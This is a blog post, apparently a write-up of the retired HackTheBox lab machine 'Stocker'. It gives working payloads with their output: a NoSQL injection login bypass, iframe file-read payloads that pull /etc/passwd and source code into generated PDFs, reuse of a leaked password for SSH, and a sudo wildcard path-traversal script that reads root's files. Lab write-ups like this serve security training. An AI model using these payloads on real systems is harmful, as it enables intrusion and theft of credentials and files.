@@ -1,0 +1,267 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️📦 HackTheBox: Stocker</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+        <main class="container">
+            
+    <h1 class="title">
+        ️📦 HackTheBox: Stocker
+    </h1>
+    <blockquote>HackTheBox | Machines | Easy | Stocker</blockquote>
+    <p class="subtitle text-end"><strong>2023-02-14</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/hack-the-box/" >
+                        #hack-the-box
+                    </a>
+                
+                    <a href="https://blog.psypherpunk.io/tags/nosqli/" >
+                        #nosqli
+                    </a>
+                
+                    <a href="https://blog.psypherpunk.io/tags/ssti/" >
+                        #ssti
+                    </a>
+                
+            </small>
+        </p>
+    
+    <p><a href="https://app.hackthebox.com/machines/Stocker">Stocker</a> is one of
+HackTheBox's <em>Easy</em> machines, now retired (hence this inaugural writeup.)</p>
+<p>Kicking things off with a traditional <code>nmap</code>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> nmap</span><span style="color:#bf616a;"> -sC -sV</span><span> 10.10.11.196
+</span><span style="color:#bf616a;">Starting</span><span> Nmap 7.92 ( https://nmap.org ) </span><span style="color:#bf616a;">at</span><span> 2023-02-13 22:02 GMT
+</span><span style="color:#bf616a;">Nmap</span><span> scan report for 10.10.11.196
+</span><span style="color:#bf616a;">Host</span><span> is up (0.0098s latency)</span><span style="color:#96b5b4;">.
+</span><span style="color:#bf616a;">Not</span><span> shown: 998 closed tcp ports (conn-refused)
+</span><span style="color:#bf616a;">PORT</span><span>   STATE SERVICE VERSION
+</span><span style="color:#bf616a;">22/tcp</span><span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; </span><span style="color:#bf616a;">protocol</span><span> 2.0)
+</span><span>| </span><span style="color:#bf616a;">ssh-hostkey: 
+</span><span>|   </span><span style="color:#bf616a;">3072</span><span> 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
+</span><span>|   </span><span style="color:#bf616a;">256</span><span> 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
+</span><span>|</span><span style="color:#bf616a;">_</span><span>  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
+</span><span style="color:#bf616a;">80/tcp</span><span> open  http    nginx 1.18.0 (Ubuntu)
+</span><span>|</span><span style="color:#bf616a;">_http-title:</span><span> Did not follow redirect to http://stocker.htb
+</span><span>|</span><span style="color:#bf616a;">_http-server-header:</span><span> nginx/1.18.0 (Ubuntu)
+</span><span style="color:#bf616a;">Service</span><span> Info: OS: Linux; </span><span style="color:#bf616a;">CPE:</span><span> cpe:/o:linux:linux_kernel
+</span><span>
+</span><span style="color:#bf616a;">Service</span><span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#bf616a;">Nmap</span><span> done: 1 IP address (1 host up) </span><span style="color:#bf616a;">scanned</span><span> in 7.31 seconds
+</span></code></pre>
+<p>The HTTP site running on port <code>80</code> gives us a hostname; another addition to
+<code>/etc/hosts</code> and we're in…and it appears to be horrid, lazy-loading IKEA
+wannabe. Perfect.</p>
+<p>The site itself seems to have little in the way of user input to exploit. Using
+<code>ffuf</code> to scan for subdomain discovery turns up <code>dev.stocker.htb</code>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">ffuf </span><span>\
+</span><span>&gt;    -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt \
+</span><span>&gt;    -u http://stocker.htb/ \
+</span><span>&gt;    -H &quot;</span><span style="color:#a3be8c;">Host: FUZZ.stocker.htb</span><span>&quot; \
+</span><span>&gt;    -mc 200,301,302
+</span><span>
+</span><span>        </span><span style="color:#bf616a;">/</span><span>&#39;</span><span style="color:#a3be8c;">___\  /</span><span>&#39;</span><span style="color:#bf616a;">___</span><span style="color:#96b5b4;">\ </span><span>          /&#39;</span><span style="color:#a3be8c;">___\
+</span><span style="color:#a3be8c;">       /\ \__/ /\ \__/  __  __  /\ \__/
+</span><span style="color:#a3be8c;">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span><span style="color:#a3be8c;">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span><span style="color:#a3be8c;">         \ \_\   \ \_\  \ \____/  \ \_\
+</span><span style="color:#a3be8c;">          \/_/    \/_/   \/___/    \/_/
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">       v1.4.1-dev
+</span><span style="color:#a3be8c;">________________________________________________
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;"> :: Method           : GET
+</span><span style="color:#a3be8c;"> :: URL              : http://stocker.htb/
+</span><span style="color:#a3be8c;"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt
+</span><span style="color:#a3be8c;"> :: Header           : Host: FUZZ.stocker.htb
+</span><span style="color:#a3be8c;"> :: Follow redirects : false
+</span><span style="color:#a3be8c;"> :: Calibration      : false
+</span><span style="color:#a3be8c;"> :: Timeout          : 10
+</span><span style="color:#a3be8c;"> :: Threads          : 40
+</span><span style="color:#a3be8c;"> :: Matcher          : Response status: 200,302
+</span><span style="color:#a3be8c;">________________________________________________
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 16ms]
+</span><span style="color:#a3be8c;">:: Progress: [49928/49928] :: Job [1/1] :: 3413 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
+</span></code></pre>
+<p>…which immediately redirects to <code>/login</code>; the site's headers at least expose
+that it's Node-/Express-based:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">┌─[root@e9b682d53cd5]─[/]
+</span><span style="color:#bf616a;">└──╼ </span><span style="color:#65737e;">#curl http://dev.stocker.htb/login \
+</span><span>&gt;     -</span><span style="color:#bf616a;">-include </span><span>\
+</span><span>&gt;     --head
+</span><span style="color:#bf616a;">HTTP/1.1</span><span> 200 OK
+</span><span style="color:#bf616a;">Server:</span><span> nginx/1.18.0 (Ubuntu)
+</span><span style="color:#bf616a;">Date:</span><span> Thu, 13 Jul 2023 18:01:56 GMT
+</span><span style="color:#bf616a;">Content-Type:</span><span> text/html; </span><span style="color:#bf616a;">charset</span><span>=</span><span style="color:#a3be8c;">UTF-8
+</span><span style="color:#bf616a;">Content-Length:</span><span> 2667
+</span><span style="color:#bf616a;">Connection:</span><span> keep-alive
+</span><span style="color:#bf616a;">X-Powered-By:</span><span> Express
+</span><span style="color:#bf616a;">Accept-Ranges:</span><span> bytes
+</span><span style="color:#bf616a;">Cache-Control:</span><span> public, max-age=0
+</span><span style="color:#bf616a;">Last-Modified:</span><span> Tue, 06 Dec 2022 09:53:59 GMT
+</span><span style="color:#bf616a;">ETag:</span><span> W/&quot;</span><span style="color:#a3be8c;">a6b-184e6db4279</span><span>&quot;
+</span><span style="color:#bf616a;">Set-Cookie:</span><span> connect.sid=s%</span><span style="color:#d08770;">3</span><span>A9SDa_ScegrHhuk2ZKZihXYd2RS2iY5K8.aoA81ZckZZ%</span><span style="color:#d08770;">2</span><span>BIh%</span><span style="color:#d08770;">2</span><span>Bj7v3XW%</span><span style="color:#d08770;">2</span><span>FcPxYRsE%</span><span style="color:#d08770;">2</span><span>FwmvAHFSmOZr29w; </span><span style="color:#bf616a;">Path</span><span>=</span><span style="color:#a3be8c;">/</span><span>; </span><span style="color:#bf616a;">HttpOnly
+</span></code></pre>
+<p>The form itself doesn't appear to be vulnerable to SQLi. The data is sent as
+a standard HTML form:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>username=admin&amp;password=admin
+</span></code></pre>
+<p>…<em><strong>but</strong></em> it doesn't seem to mind accepting JSON, either: by updating the
+<code>Content-Type</code> header to <code>application/json</code> and sending
+<code>{&quot;admin&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;password&quot;}</code> results in exactly the same
+problem. That doesn't improve the SQLi situation but it does expose another
+avenue…</p>
+<p>Taking more than a hint from HackTricks' page on
+<a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass">NoSQL Injection</a>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">┌─[✗]─[root@psy-xps-13]─[/]
+</span><span style="color:#bf616a;">└──╼ </span><span style="color:#65737e;">#curl http://dev.stocker.htb/login \
+</span><span>&gt;    -</span><span style="color:#bf616a;">-include </span><span>\
+</span><span>&gt;    --request POST \
+</span><span>&gt;    --header &quot;</span><span style="color:#a3be8c;">content-type: application/json</span><span>&quot; \
+</span><span>&gt;    --data-raw &#39;</span><span style="color:#a3be8c;">{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} }</span><span>&#39;
+</span><span style="color:#bf616a;">HTTP/1.1</span><span> 302 Found
+</span><span style="color:#bf616a;">Server:</span><span> nginx/1.18.0 (Ubuntu)
+</span><span style="color:#bf616a;">Date:</span><span> Mon, 13 Feb 2023 22:16:29 GMT
+</span><span style="color:#bf616a;">Content-Type:</span><span> text/plain; </span><span style="color:#bf616a;">charset</span><span>=</span><span style="color:#a3be8c;">utf-8
+</span><span style="color:#bf616a;">Content-Length:</span><span> 28
+</span><span style="color:#bf616a;">Connection:</span><span> keep-alive
+</span><span style="color:#bf616a;">X-Powered-By:</span><span> Express
+</span><span style="color:#bf616a;">Location:</span><span> /stock
+</span><span style="color:#bf616a;">Vary:</span><span> Accept
+</span><span style="color:#bf616a;">Set-Cookie:</span><span> connect.sid=s%</span><span style="color:#d08770;">3</span><span>A9ky8Z--1FN78hQ1EXnBQx1BCvhcCZx5T.94Zdxo7no1vHL%</span><span style="color:#d08770;">2</span><span>BN%</span><span style="color:#d08770;">2</span><span>FKdt3gaBvKNc%</span><span style="color:#d08770;">2</span><span>FdoRcY4uLYbbG3wc; </span><span style="color:#bf616a;">Path</span><span>=</span><span style="color:#a3be8c;">/</span><span>; </span><span style="color:#bf616a;">HttpOnly
+</span><span>
+</span><span style="color:#bf616a;">Found.</span><span> Redirecting to /stock
+</span></code></pre>
+<p>Armed with that cookie, access is granted to the effacious <em>Buy Stock Now!</em>
+page.</p>
+<p>Placing an order results in a series of API calls, ending in a final request
+which returns a PDF:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>http://dev.stocker.htb/api/po/63eab7b2230e6010f28157f9
+</span></code></pre>
+<p>…the API call for which can be replicated via:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> curl http://dev.stocker.htb/api/order \
+</span><span style="color:#bf616a;">  --request</span><span> POST \
+</span><span style="color:#bf616a;">  --include </span><span>\
+</span><span style="color:#bf616a;">  --header </span><span>&quot;</span><span style="color:#a3be8c;">cookie: connect.sid=s%3A9ky8Z--1FN78hQ1EXnBQx1BCvhcCZx5T.94Zdxo7no1vHL%2BN%2FKdt3gaBvKNc%2FdoRcY4uLYbbG3wc</span><span>&quot; \
+</span><span style="color:#bf616a;">  --header </span><span>&quot;</span><span style="color:#a3be8c;">content-type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">  --data-raw </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;basket&quot;:[{ &quot;_id&quot;: &quot;638f116eeb060210cbd83a8d&quot;, &quot;title&quot;: &quot;Cup&quot;, &quot;description&quot;: &quot;It</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">s a red cup.&quot;, &quot;image&quot;: &quot;red-cup.jpg&quot;, &quot;price&quot;: 32, &quot;currentStock&quot;: 4, &quot;__v&quot;: 0 } ]}</span><span>&#39;
+</span><span style="color:#bf616a;">HTTP/1.1</span><span> 200 OK
+</span><span style="color:#bf616a;">Server:</span><span> nginx/1.18.0 (Ubuntu)
+</span><span style="color:#bf616a;">Date:</span><span> Mon, 13 Feb 2023 22:33:46 GMT
+</span><span style="color:#bf616a;">Content-Type:</span><span> application/json; </span><span style="color:#bf616a;">charset</span><span>=</span><span style="color:#a3be8c;">utf-8
+</span><span style="color:#bf616a;">Content-Length:</span><span> 53
+</span><span style="color:#bf616a;">Connection:</span><span> keep-alive
+</span><span style="color:#bf616a;">X-Powered-By:</span><span> Express
+</span><span style="color:#bf616a;">ETag:</span><span> W/&quot;</span><span style="color:#a3be8c;">35-djyU+27H8TRiGh1AzsSVisDwuAw</span><span>&quot;
+</span><span>
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">success</span><span>&quot;</span><span style="color:#bf616a;">:true,</span><span>&quot;</span><span style="color:#a3be8c;">orderId</span><span>&quot;</span><span style="color:#bf616a;">:</span><span>&quot;</span><span style="color:#a3be8c;">63eabaca230e6010f2819858</span><span>&quot;}
+</span></code></pre>
+<p>It's reasonable to make some assumptions about the PDF generation, server-side;
+assumptions that are, thankfully, pretty well documented—again—on HackTricks'
+page on
+<a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Server Side XSS (Dynamic PDF)</a>.</p>
+<p>After experimenting with various of the input fields listed above, it seems
+that the <code>title</code> field offers a fair vulnerability; replacing its contents
+with:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>&lt;iframe src=file:///etc/passwd height=750 width=750&gt;&lt;/iframe&gt;
+</span></code></pre>
+<p>…proudly displays the contents of <code>/etc/passwd</code> in the resulting PDF. However,
+that's not the most useful thing ever, as it turns out. It might be possible to
+infer something about the location of the site on the server; however, it's
+equally possible to make an educated guess: it's <code>dev.stocker.htb</code>, it's
+JavaScript, it's NGINX: <code>/var/www/dev/index.js</code>, anyone?</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>&lt;iframe src=file:///var/www/dev/index.js height=750 width=750&gt;&lt;/iframe&gt;
+</span></code></pre>
+<p>The resulting PDF can then be downloaded, based on the <code>orderId</code> received:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> curl http://dev.stocker.htb/api/po/63eabaca230e6010f2819858 \
+</span><span style="color:#bf616a;">  --request</span><span> GET \
+</span><span style="color:#bf616a;">  --include </span><span>\
+</span><span style="color:#bf616a;">  --header </span><span>&quot;</span><span style="color:#a3be8c;">cookie: connect.sid=s%3A9ky8Z--1FN78hQ1EXnBQx1BCvhcCZx5T.94Zdxo7no1vHL%2BN%2FKdt3gaBvKNc%2FdoRcY4uLYbbG3wc</span><span>&quot;  \
+</span><span style="color:#bf616a;">  --output</span><span> htb.pdf
+</span></code></pre>
+<p>Using <code>pdftotext</code> makes reading things a little easier and the PDF contains
+this little nugget:</p>
+<pre data-lang="js" style="background-color:#2b303b;color:#c0c5ce;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#65737e;">// TODO: Configure loading from dotenv for production
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">dbURI </span><span>= &quot;</span><span style="color:#a3be8c;">mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev</span><span style="background-color:#bf616a;color:#2b303b;">?</span><span>
+</span><span style="color:#bf616a;">authSource</span><span>=</span><span style="color:#bf616a;">admin</span><span>&amp;</span><span style="color:#bf616a;">w</span><span>=</span><span style="color:#d08770;">1</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">;</span><span>
+</span></code></pre>
+<p>However, those credentials don't actually work; recall that earlier I said
+the contents of <code>/etc/passwd</code> weren't useful? Yeah…</p>
+<p><code>/etc/passwd</code> has only one real target: a user called <code>angoose</code>. Coupled with
+the above password, <strong>we're in</strong>*:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> ssh angoose@stocker.htb
+</span><span style="color:#bf616a;">angoose@stocker.htb</span><span>&#39;</span><span style="color:#a3be8c;">s password:
+</span><span style="color:#a3be8c;">angoose@stocker:~$ cat user.txt
+</span><span style="color:#a3be8c;">01bf567f5e24405502cc4e3522b5f542
+</span></code></pre>
+<p>Thankfully, a classic <code>sudo -l</code> shows promise:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">angoose@stocker:~$</span><span> sudo</span><span style="color:#bf616a;"> -l
+</span><span style="color:#bf616a;">[sudo]</span><span> password for angoose: 
+</span><span style="color:#bf616a;">Matching</span><span> Defaults entries for angoose on stocker:
+</span><span>    </span><span style="color:#bf616a;">env_reset,</span><span> mail_badpass, secure_path=/usr/local/sbin</span><span style="color:#96b5b4;">\:</span><span>/usr/local/bin</span><span style="color:#96b5b4;">\:</span><span>/usr/sbin</span><span style="color:#96b5b4;">\:</span><span>/usr/bin</span><span style="color:#96b5b4;">\:</span><span>/sbin</span><span style="color:#96b5b4;">\:</span><span>/bin</span><span style="color:#96b5b4;">\:</span><span>/snap/bin
+</span><span>
+</span><span style="color:#bf616a;">User</span><span> angoose may run the following commands on stocker:
+</span><span>    (</span><span style="color:#bf616a;">ALL</span><span>) /usr/bin/node /usr/local/scripts/*.js
+</span></code></pre>
+<p>Wildcard? Nice. Firstly, <code>touch /tmp/root.txt</code>; then create a file <code>/tmp/htb.js</code>:</p>
+<pre data-lang="js" style="background-color:#2b303b;color:#c0c5ce;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#b48ead;">const </span><span style="color:#bf616a;">fs </span><span>= </span><span style="color:#96b5b4;">require</span><span>(&quot;</span><span style="color:#a3be8c;">child_process</span><span>&quot;).</span><span style="color:#8fa1b3;">spawn</span><span>(&quot;</span><span style="color:#a3be8c;">cp</span><span>&quot;, [&quot;</span><span style="color:#a3be8c;">/root/root.txt</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">/tmp/root.txt</span><span>&quot;])
+</span></code></pre>
+<p>The
+<a href="https://nodejs.org/api/child_process.html#child_processspawncommand-args-options">above</a>
+will copy the contents of the root flag into the already-existing
+<code>/tmp/root.txt</code> (there are other ways to get a root shell but this minimises
+changes to the system.)</p>
+<p>When the above is executed:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">angoose@stocker:~$</span><span> sudo /usr/bin/node /usr/local/scripts/../../../tmp/htb.js
+</span><span style="color:#bf616a;">angoose@stocker:~$</span><span> cat /tmp/root.txt
+</span><span style="color:#bf616a;">bb630ba67e8d3f48ada9a2bbae974479
+</span></code></pre>
+<p><img src="/img/htb-stocker-pwned.png" alt="Stocker has been Pwned!" title="Stocker has been Pwned!" /></p>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2024 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
